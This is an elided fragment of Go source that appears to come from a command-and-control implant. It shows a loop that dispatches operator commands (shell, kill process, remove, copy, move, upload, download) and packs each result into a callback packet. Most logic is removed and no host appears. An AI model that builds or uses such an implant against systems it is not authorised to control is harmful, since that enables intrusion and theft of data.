					...
					for {
						...
						if cmdBuf != nil {
							...
							case command.CMD_TYPE_SHELL:
								...
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, result)
							...
							case command.CMD_TYPE_KILL:
								...
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, []byte(fmt.Sprintf("kill process %d success", pid)))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_REMOVE:
								...
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, []byte(fmt.Sprintf("remove %s success", cmdBuf)))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_FILE_COPY:
								...
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, []byte(fmt.Sprintf("copy %s to %s", src, dst)))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_FILE_MOVE:
								...
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, []byte(fmt.Sprintf("move %s to %s", src, dst)))
								packet.PushResult(finalPacket)
							...
							case command.CMD_TYPE_UPLOAD_LOOP:
								...
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, []byte(fmt.Sprintf("upload %s success", filePath)))
								packet.PushResult(finalPacket)
							...
							case command.CMD_TYPE_DOWNLOAD:
								...
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT_UTF8, []byte(fmt.Sprintf("download %s success", filePath)))
								packet.PushResult(finalPacket)
